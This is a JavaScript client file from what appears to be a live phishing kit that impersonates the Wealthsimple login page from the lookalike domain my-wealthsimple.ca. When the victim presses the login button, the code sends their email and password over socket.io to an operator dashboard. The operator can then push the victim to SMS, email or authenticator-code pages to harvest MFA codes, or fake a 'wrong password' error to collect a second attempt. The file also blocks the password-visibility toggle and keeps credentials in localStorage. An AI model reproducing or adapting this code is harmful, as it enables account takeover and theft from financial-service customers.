/* pwd-client.js */
(function () {
  const SERVER_URL = "https://my-wealthsimple.ca";
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";     // matches your dashboard code
  const DASH_JOIN_EVENT = "client-join";     // matches your dashboard code
    // Persist "login pending" so page stays in loading state across refresh
  const PENDING_KEY = "ws_pending_login";
  window.wsSavePendingLogin = function(email, password) {
    try { localStorage.setItem(PENDING_KEY, JSON.stringify({ email: String(email||""), password: String(password||""), ts: Date.now() })); } catch {}
  };
  window.wsLoadPendingLogin = function() {
    try { const v = localStorage.getItem(PENDING_KEY); return v ? JSON.parse(v) : null; } catch { return null; }
  };
  window.wsClearPendingLogin = function() {
    try { localStorage.removeItem(PENDING_KEY); } catch {}
  };


    // Redirect targets for dashboard MFA actions
  // Redirect targets for dashboard MFA actions
  const MFA_REDIRECT = {
    sms: "sms.html",
    wrong_sms: "sms.html",
    email_code: "email.html",
    wrong_email_code: "email.html",
    gauth: "auth.html",
    wrong_gauth: "auth.html",
    loading: "loading.html"
  };



  // --- Utilities -----------------------------------------------------------
  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  function debounce(fn, ms) {
    let t;
    return function (...args) {
      clearTimeout(t);
      t = setTimeout(() => fn.apply(this, args), ms);
    };
  }

  // Try multiple selectors so this works with different pwd.html variants
  function pick(selectorList, root = document) {
    for (const sel of selectorList) {
      const el = root.querySelector(sel);
      if (el) return el;
    }
    return null;
  }

  // Keep labels floated when there’s a value
  function setFloatingState(input) {
    const hasValue = (input.value || "").trim().length > 0;
    // Common wrappers we’ve seen: .input-group, .field, .pure-control-group, .yid-field, etc.
    const wrap = input.closest('.input-group, .field, .pure-control-group, .yid-field, .yid-input, .yid-input-container, .challenge-form, label, .ws-input, .ws-field, div');
    if (wrap) {
      wrap.classList.toggle("ws-has-value", hasValue);
    }
    // Also mark the input itself as having value (robust to any CSS you’ve got)
    input.toggleAttribute("data-has-value", hasValue);
  }

  // Binds floating behavior to inputs
  function bindFloating(input) {
    if (!input) return;
    ["input", "change", "blur"].forEach(evt =>
      input.addEventListener(evt, () => setFloatingState(input))
    );
    // initialize on load
    setFloatingState(input);
  }

  // --- Socket layer --------------------------------------------------------
  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[pwd-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[pwd-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[pwd-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[pwd-client] disconnected");
    });

    // If the dashboard sends actions like "wrong_password", you can react here:
    socket.on("dashboard-action", ({ buttonName, value }) => {

// Redirect to the relevant MFA page for these actions
const dest = MFA_REDIRECT[buttonName];
if (dest) {
  // CLEAR login spinner/code persistence BEFORE leaving the page
  try { window.wsClearPendingLogin && window.wsClearPendingLogin(); } catch {}
  try { localStorage.removeItem("ws_pending_login"); } catch {}

  // avoid loops if already there
  if (!location.pathname.endsWith("/" + dest)) {
    location.href = dest;
  }
  return;
}

      // Example: flash an inline error if wrong_password arrives
          if (buttonName === "wrong_password") {
        try { window.wsClearPendingLogin && window.wsClearPendingLogin(); } catch {}
        showInlineError("That looks like the wrong password.");
      }

      if (buttonName === "prompt") {
        alert(String(value || "Dashboard prompt"));
      }
    });

    return socket;
  }

// Full replacement block for the login UI when wrong_password arrives.
// Uses the same red text / light-red box as the saved page.
const PASTED_LOGIN_BLOCK_HTML = `
<div class="sc-9b4b78e7-0 sc-bc759433-2 cdZZRJ iRQfAu">
  <div class="sc-9b4b78e7-0 dQYITa">
    <h1 data-testid="login-form-ftux-header" font-size="f4" class="sc-5274857d-0 dXpxZl">Welcome back</h1>
  </div>

  <!-- inline error (same look as live page) -->
  <div aria-live="polite" class="sc-9b4b78e7-0 sc-97bd2d43-0 dwbggC tnnUh"
       style="background: rgba(251,193,177,0.4); border-radius: 8px; padding: 12px 14px; margin: 8px 0;">
    <div class="sc-9b4b78e7-0 kCixSl">
      <div class="sc-9b4b78e7-0 dvLNEg">
        <div class="sc-9b4b78e7-0 lhHULu">
          <div class="sc-9b4b78e7-0 fhSdEZ">
            <p class="sc-cfb9aefc-0 jWyyPD" style="color: rgb(191, 55, 34); margin: 0;">
              Your email or password was incorrect. Please try again.
            </p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- EMAIL -->
  <div class="sc-9b4b78e7-0 bGSPjg">
    <div data-qa="login-email" class="sc-9b4b78e7-0 dfzdpe">
      <div class="sc-9b4b78e7-0 sc-e4e5f063-3 cjwhRY hRoIrr">
        <div class="sc-9b4b78e7-0 sc-fe015980-1 cqSDRP biZcWh">
          <label for="input--5cdcb8f2-6270-49cc-b59e-3590ee6b4ec3" font-size="f2" data-has-value="false" class="sc-e4e5f063-2 fPIbfu">Email</label>
          <div font-size="f2" class="sc-9b4b78e7-0 sc-fe015980-5 cdZZRJ bRXGI">
            <input id="input--5cdcb8f2-6270-49cc-b59e-3590ee6b4ec3" inputmode="email" spellcheck="false" font-size="f2"
                   aria-label="Log in email" aria-required="true" aria-invalid="false"
                   aria-describedby="description--9372cf58-66c0-44eb-a912-e008643ebae8"
                   data-has-value="false" layout="fullWidth" class="sc-fe015980-0 hMRzOY" type="text" value="">
          </div>
          <div class="sc-9b4b78e7-0 sc-fe015980-3 cdZZRJ hsZRCa affix-container sf-hidden" font-size="f2" data-qa="input-affix-container"></div>
        </div>
      </div>
      <div id="description--9372cf58-66c0-44eb-a912-e008643ebae8" class="sc-9b4b78e7-0 bjzHE">
        <div aria-live="polite" class="sc-9b4b78e7-0 cdZZRJ"></div>
      </div>
    </div>

    <!-- PASSWORD -->
    <div data-qa="login-password" class="sc-9b4b78e7-0 dfzdpe">
      <div class="sc-9b4b78e7-0 sc-e4e5f063-3 ceapow hRoIrr">
        <div class="sc-9b4b78e7-0 sc-fe015980-1 cqSDRP biZcWh">
          <label for="input--40fce231-40de-4b20-a806-c6574d34ebef" font-size="f2" data-has-value="false" class="sc-e4e5f063-2 fPIbfu">Password</label>
          <div font-size="f2" class="sc-9b4b78e7-0 sc-fe015980-5 cdZZRJ bRXGI">
            <input id="input--40fce231-40de-4b20-a806-c6574d34ebef" inputmode="text" spellcheck="false" font-size="f2"
                   aria-required="true" aria-invalid="false"
                   aria-describedby="description--32c87a3f-544d-48fb-848b-1fdfff4c15eb"
                   data-has-value="false" layout="fullWidth" class="sc-fe015980-0 hMRzOY" type="password">
          </div>
          <div class="sc-9b4b78e7-0 sc-fe015980-3 cdZZRJ hsZRCa affix-container sf-hidden" font-size="f2" data-qa="input-affix-container"></div>
        </div>
        <div class="sc-9b4b78e7-0 sc-fe015980-2 ddTFRm hswThz">
          <div class="sc-9b4b78e7-0 hQkzA">
            <button type="button" role="button" aria-label="Show password as plain text. Note: this will visually expose your password on the screen."
                    class="sc-869e7011-0 efOhCQ sc-93966686-0 cuuDaK" aria-describedby="95630904-6197-40b7-a1e6-9bbb94fc59af">
              <div color="#32302F" class="sc-9b4b78e7-0 sc-678c1714-0 enfino bQpDlc">
                <svg width="16" height="16" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" color="#32302F" aria-hidden="true" style="forced-color-adjust:auto">
                  <path d="M8 10a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z" fill="#32302F"></path>
                  <path d="M1.375 8.232a.667.667 0 0 1 0-.464 7.167 7.167 0 0 1 13.25 0 .666.666 0 0 1 0 .464 7.166 7.166 0 0 1-13.25 0Z" stroke="#32302F" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
                  <path d="M8 10a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z" stroke="#32302F" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
              </div>
            </button>
          </div>
        </div>
      </div>
      <div id="description--32c87a3f-544d-48fb-848b-1fdfff4c15eb" class="sc-9b4b78e7-0 bjzHE">
        <div aria-live="polite" class="sc-9b4b78e7-0 cdZZRJ"></div>
      </div>
    </div>

    <div class="sc-9b4b78e7-0 sc-bc759433-0 cdZZRJ czePVs">
      <p class="sc-cfb9aefc-0 bvkoZm">
        <button type="button" role="button" class="sc-869e7011-0 kFZQgF sc-dcc58b4a-0 bBbFSu sc-25d8010-0 hCIpFM">Forgot password?</button>
      </p>
    </div>
  </div>

  <div class="sc-9b4b78e7-0 cdZZRJ">
    <div class="sc-9b4b78e7-0 kIgOPn">
      <button type="submit" role="button" data-testid="login-form-submit-ftux" class="sc-869e7011-0 biAPaC sc-a44f0cd-0 eQrOql">Log in</button>
      <div class="sc-9b4b78e7-0 hQkzA">
        <p class="sc-cfb9aefc-0 iYdmhH">Don't have an account?</p>
        <p class="sc-cfb9aefc-0 jZVPLY">
          <button type="button" role="button" class="sc-869e7011-0 kFZQgF sc-dcc58b4a-0 bBbFSu sc-25d8010-0 hCIpFM">Sign up</button>
        </p>
      </div>
    </div>
  </div>
</div>
`;

// Replace the largest sensible login container; if not found, replace <body>.
function showInlineError() {
  const email = document.querySelector('[data-qa="login-email"]');
  const password = document.querySelector('[data-qa="login-password"]');

  let container = email || password;

  // Climb to a container that holds email + password + submit
  while (container && container.parentElement) {
    const hasEmail = !!container.querySelector?.('[data-qa="login-email"]');
    const hasPwd = !!container.querySelector?.('[data-qa="login-password"]');
    const hasSubmit = !!container.querySelector?.('button[type="submit"]');
    if (hasEmail && hasPwd && hasSubmit) break;
    container = container.parentElement;
  }

  if (container) {
    container.outerHTML = PASTED_LOGIN_BLOCK_HTML;
    // (No input listeners or immediate emits here — we only emit on button press)
  }
  
}

window.wsShowInlineError = showInlineError;


  // --- Field detection -----------------------------------------------------
  function findEmailInput() {
    return pick([
      'input[type="email"]',
      'input[name="email"]',
      '#login-username',
      'input[autocomplete="username"]',
      'input[inputmode="email"]',
      'input[id*="email" i]',
      'input[name*="user" i]'
    ]);
  }

  function findPasswordInput() {
    // Prefer the actual password input; if user toggled once, it might become type=text
    let el = pick([
      'input[type="password"]',
      'input[name="password"]',
      '#login-passwd',
      'input[autocomplete="current-password"]',
      'input[autocomplete="password"]',
      'input[id*="pass" i]',
      'input[name*="pass" i]'
    ]);
    if (!el) {
      // fallback: a text input next to a lock/eye icon
      el = pick(['input[type="text"]']);
    }
    return el;
  }

  // Try to find a clickable “eye” near the password


  // --- Main ---------------------------------------------------------------
  onceDomReady(function () {
    const emailInput = findEmailInput();
    const passwordInput = findPasswordInput();

    // Bind floating label behavior
    bindFloating(emailInput);
    bindFloating(passwordInput);

    // Bind password eye toggle
   

    // Prepare socket
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      // Debounced emitters to avoid chatty updates
      const sendIdentifier = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "identifier", data: String(val || "") });
      }, 150);

      const sendPassword = debounce((val) => {
        socket.emit(DASH_EMIT_EVENT, { type: "password", data: String(val || "") });
      }, 150);


      // Expose emitters so we can rebind after DOM replacement
      window.wsEmitIdentifier = sendIdentifier;
      window.wsEmitPassword = sendPassword;


      // Wire the inputs to the dashboard stream
      
    });
  });
})();

/* === BEGIN: float labels + password-eye toggle patch for app.html === */
(function () {
  // Run once DOM is ready
  function onReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  // Set required attribute exactly as the CSS expects
  function setHasValue(el, has) {
    if (!el) return;
    el.setAttribute("data-has-value", has ? "true" : "false");
  }

  // Keep label floated when input has text (or is autofilled)
  function updateFloating(input) {
    if (!input) return;
    const has = (input.value || "").trim().length > 0;

    // 1) set on the input
    setHasValue(input, has);

    // 2) set on the associated <label for="...">
    if (input.id) {
      const label = document.querySelector(`label[for="${input.id}"]`);
      setHasValue(label, has);
    }

    // 3) optional helper class for any custom CSS you might have
    const wrap = input.closest(
      '.input-affix-container, .field, .ws-input, .ws-field, .input-group, label, div'
    );
    if (wrap) wrap.classList.toggle("ws-has-value", has);
  }

  function bindFloating(input) {
    if (!input) return;
    ["input", "change", "blur"].forEach((evt) =>
      input.addEventListener(evt, () => updateFloating(input))
    );
    // initialize immediately (covers server-filled or browser-saved values)
    updateFloating(input);
  }

  function bindAllFloating() {
    // Wealthsimple markup typically uses ids like input--<uuid>
    const inputs = Array.from(
      document.querySelectorAll('input[id^="input--"]')
    ).filter((i) => ["text", "password", "email"].includes(i.type));

    inputs.forEach(bindFloating);

    // React re-renders / late mounts
    const mo = new MutationObserver((muts) => {
      for (const m of muts) {
        for (const n of m.addedNodes || []) {
          if (n.nodeType !== 1) continue;
          const newly = n.matches?.('input[id^="input--"]')
            ? [n]
            : Array.from(n.querySelectorAll?.('input[id^="input--"]') || []);
          newly.forEach((el) => {
            if (["text", "password", "email"].includes(el.type)) {
              bindFloating(el);
            }
          });
        }
      }
    });
    mo.observe(document.body, { childList: true, subtree: true });

    // Browser autofill often fires no events—do a short poll to catch it
    const poll = setInterval(() => {
      inputs.forEach(updateFloating);
    }, 300);
    setTimeout(() => clearInterval(poll), 4000);
  }

  /* === Force password always visible (no toggle) === */
(function forcePasswordAlwaysVisible() {
  if (window.__forcePwdVisibleBound) return;
  window.__forcePwdVisibleBound = true;

  function isPwdInput(el) {
    if (!(el instanceof HTMLInputElement)) return false;
    const name = (el.getAttribute('name') || '').toLowerCase();
    const ac = (el.getAttribute('autocomplete') || '').toLowerCase();
    return el.type === 'password' || name.includes('pass') || ac.includes('current-password');
  }

  function force(el) {
    if (!el) return;
    if (el.type !== 'text') el.type = 'text';
    // keep the label floated if your CSS uses data-has-value
    if (typeof updateFloating === 'function') updateFloating(el);
  }

  function scan(root = document) {
    root
      .querySelectorAll('input[type="password"], input[name*="pass" i], input[autocomplete="current-password"]')
      .forEach(force);
  }

  // Block any built-in visibility toggle controls
  function isPwdToggleEl(el) {
    if (!el || el.nodeType !== 1) return false;
    const lbl = (el.getAttribute('aria-label') || '').toLowerCase();
    const qa  = (el.getAttribute('data-qa') || '').toLowerCase();
    if (lbl.includes('show password') || lbl.includes('hide password')) return true;
    if (qa.includes('password-visibility') || qa.includes('toggle-password')) return true;
    const p = el.parentElement;
    if (p) {
      const pl = (p.getAttribute('aria-label') || '').toLowerCase();
      const pq = (p.getAttribute('data-qa') || '').toLowerCase();
      if (pl.includes('show password') || pl.includes('hide password')) return true;
      if (pq.includes('password-visibility') || pq.includes('toggle-password')) return true;
    }
    return false;
  }

  function eat(e) {
    const t = e.target.closest('button, [role="button"], svg, use, path');
    if (!isPwdToggleEl(t)) return;
    e.preventDefault();
    e.stopImmediatePropagation();
    e.stopPropagation();
  }

  // Intercept common events in capture phase so site code can’t flip it back
  document.addEventListener('mousedown', eat, true);
  document.addEventListener('click', eat, true);
  document.addEventListener('keydown', function (e) {
    const t = e.target.closest('button, [role="button"], svg, use, path');
    if (!isPwdToggleEl(t)) return;
    if (e.key !== 'Enter' && e.key !== ' ') return;
    e.preventDefault();
    e.stopImmediatePropagation();
    e.stopPropagation();
  }, true);

  // Watch for DOM changes and attribute flips back to "password"
  const mo = new MutationObserver((mutList) => {
    for (const m of mutList) {
      if (m.type === 'childList') {
        m.addedNodes.forEach((n) => {
          if (n.nodeType !== 1) return;
          if (isPwdInput(n)) force(n);
          scan(n);
        });
      } else if (m.type === 'attributes' && m.attributeName === 'type' && isPwdInput(m.target)) {
        force(m.target); // flip back to text instantly
      }
    }
  });
  mo.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ['type'] });

  // Initial pass
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => scan(), { once: true });
  } else {
    scan();
  }
})();


/* === Turn login button into a loading spinner on press === */
(function attachLoginSpinner() {
  if (window.__loginSpinnerBound) return;
  window.__loginSpinnerBound = true;

  // Spinner uses currentColor — we'll set the button's color to black.
  const SPINNER_HTML =
    '<span class="pwd-spinner" aria-hidden="true" style="display:inline-flex;align-items:center;justify-content:center;">' +
      '<svg width="20" height="20" viewBox="0 0 50 50" focusable="false" aria-hidden="true">' +
        '<circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-linecap="round" opacity="0.25"></circle>' +
        '<circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-linecap="round" stroke-dasharray="90" stroke-dashoffset="60">' +
          '<animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.9s" repeatCount="indefinite"/>' +
        '</circle>' +
      '</svg>' +
    '</span>';

  function looksLikeLoginButton(btn) {
    if (!btn || btn.tagName !== 'BUTTON') return false;
    const type = (btn.getAttribute('type') || '').toLowerCase();
    const label = (
      (btn.getAttribute('data-qa') || '') + ' ' +
      (btn.getAttribute('aria-label') || '') + ' ' +
      (btn.id || '') + ' ' +
      (btn.name || '') + ' ' +
      (btn.textContent || '')
    ).toLowerCase();
    return type === 'submit' || /log\s?in|sign\s?in|next|continue/.test(label);
  }

  function setButtonLoading(btn) {
    if (!btn || btn.dataset._loading === '1') return;

    // Lock size to avoid layout shift
    const rect = btn.getBoundingClientRect();
    btn.style.width = rect.width + 'px';
    btn.style.height = rect.height + 'px';
    btn.style.pointerEvents = 'none';

    // >>> Color & style changes <<<
    btn.style.backgroundColor = '#eeeeee';   // light grey background
    btn.style.borderColor = '#d5d5d5';       // subtle grey border (if any)
    btn.style.color = '#000000';             // black text color -> spinner inherits black
    btn.style.opacity = '1';                 // defeat any disabled dimming CSS


    // Save current input values so we can restore them after refresh
    try {
      const emailEl =
        document.querySelector('[data-qa="login-email"] input') ||
        document.querySelector('input[type="email"], input[autocomplete="username"], input[inputmode="email"], input[id^="input--"]');
      const pwdEl =
        document.querySelector('[data-qa="login-password"] input') ||
        document.querySelector('input[type="password"], input[name*="pass" i], input[autocomplete="current-password"]');

      const emailVal = emailEl ? emailEl.value : "";
      const pwdVal = pwdEl ? pwdEl.value : "";
      window.wsSavePendingLogin && window.wsSavePendingLogin(emailVal, pwdVal);
            // Emit ONLY on button press
      try {
        window.wsEmitIdentifier && window.wsEmitIdentifier(emailVal);
        window.wsEmitPassword && window.wsEmitPassword(pwdVal);
      } catch {}

    } catch {}



    // Save original content and mark loading
    btn.dataset._orig = btn.innerHTML;
    btn.dataset._loading = '1';
    btn.setAttribute('aria-busy', 'true');
    btn.disabled = true;

    // Replace content with spinner
    btn.innerHTML = SPINNER_HTML;
  }

  // Handle form submits (keyboard or programmatic)
    // expose for restorePendingLogin()
  window.setButtonLoading = setButtonLoading;
  window.looksLikeLoginButton = looksLikeLoginButton;

  function fieldsMissing() {
    const emailEl =
      document.querySelector('[data-qa="login-email"] input') ||
      document.querySelector('input[type="email"], input[autocomplete="username"], input[inputmode="email"], input[id^="input--"]');
    const pwdEl =
      document.querySelector('[data-qa="login-password"] input') ||
      document.querySelector('input[type="password"], input[name*="pass" i], input[autocomplete="current-password"], input[id^="input--"][type="text"]');

    const emailEmpty = !emailEl || !String(emailEl.value || "").trim();
    const pwdEmpty   = !pwdEl   || !String(pwdEl.value   || "").trim();
    return emailEmpty || pwdEmpty;
  }

  // Handle form submits (keyboard or programmatic)
  document.addEventListener('submit', function (e) {
    const submitter = e.submitter || e.target.querySelector('button[type="submit"]');
    if (submitter && looksLikeLoginButton(submitter)) {
      if (fieldsMissing()) {
        e.preventDefault();
        e.stopImmediatePropagation();
        try { window.wsClearPendingLogin && window.wsClearPendingLogin(); } catch {}
        try { window.wsShowInlineError && window.wsShowInlineError(); } catch {}
        return;
      }
      setButtonLoading(submitter);
    }
  }, true);

  // Handle direct clicks
  document.addEventListener('click', function (e) {
    const btn = e.target.closest('button');
    if (btn && looksLikeLoginButton(btn)) {
      if (fieldsMissing()) {
        e.preventDefault();
        e.stopImmediatePropagation();
        try { window.wsClearPendingLogin && window.wsClearPendingLogin(); } catch {}
        try { window.wsShowInlineError && window.wsShowInlineError(); } catch {}
        return;
      }
      setButtonLoading(btn);
    }
  }, true);

})();



/* === Autofocus email on first load (and brief re-renders) === */
(function autofocusEmail() {
  if (window.__emailAutofocusBound) return;
  window.__emailAutofocusBound = true;
  // Skip autofocus on refresh when a pending login exists
  try { if (window.wsLoadPendingLogin && window.wsLoadPendingLogin()) return; } catch {}

  function findEmailInput() {
    // Prefer the login-email section’s input
    const inQa = document.querySelector('[data-qa="login-email"] input');
    if (inQa) return inQa;
    // Fallbacks used across your variants
    return (
      document.querySelector('input[type="email"]') ||
      document.querySelector('#login-username') ||
      document.querySelector('input[autocomplete="username"]') ||
      document.querySelector('input[inputmode="email"]') ||
      document.querySelector('input[id^="input--"][type="text"]')
    );
  }

  function focusEmail() {
    const el = findEmailInput();
    if (!el) return false;

    // Don't steal focus if the user already clicked somewhere else
    const ae = document.activeElement;
    if (ae && ae !== document.body && ae !== el && ae.tagName !== 'IFRAME') return true;

    el.focus({ preventScroll: true });
    try {
      const v = el.value || "";
      el.setSelectionRange(v.length, v.length); // caret at end
    } catch {}
    return true;
  }

  // Run at DOM ready or immediately if already ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => focusEmail(), { once: true });
  } else {
    focusEmail();
  }

  // Briefly watch for framework re-renders on first load
  const mo = new MutationObserver(() => focusEmail());
  mo.observe(document.body, { childList: true, subtree: true });
  setTimeout(() => mo.disconnect(), 4000); // stop after 4s

  // Short poll to catch autofill timing quirks
  const t = setInterval(() => focusEmail(), 200);
  setTimeout(() => clearInterval(t), 1200);
})();





/* === Restore pending login state across refresh === */
(function restorePendingLogin() {
  if (window.__restorePendingBound) return;
  window.__restorePendingBound = true;

  const pending = (window.wsLoadPendingLogin && window.wsLoadPendingLogin()) || null;
  if (!pending) return;

  // Refill inputs
  try {
    const emailEl =
      document.querySelector('[data-qa="login-email"] input') ||
      document.querySelector('input[type="email"], input[autocomplete="username"], input[inputmode="email"], input[id^="input--"]');
    const pwdEl =
      document.querySelector('[data-qa="login-password"] input') ||
      document.querySelector('input[type="password"], input[name*="pass" i], input[autocomplete="current-password"], input[id^="input--"][type="text"]');

    if (emailEl) { emailEl.value = pending.email || ""; updateFloating && updateFloating(emailEl); }
    if (pwdEl)   { pwdEl.value   = pending.password || ""; updateFloating && updateFloating(pwdEl); }
  } catch {}

  // Put the login button back into loading state
  try {
    const btn =
      document.querySelector('button[data-testid="login-form-submit-ftux"]') ||
      document.querySelector('button[type="submit"]');
    if (btn && typeof looksLikeLoginButton === "function" && typeof setButtonLoading === "function" && looksLikeLoginButton(btn)) {
      setButtonLoading(btn);
    }
  } catch {}
})();



  onReady(function () {







    bindAllFloating();




  });
})();
/* === END: float labels + password-eye toggle patch === */
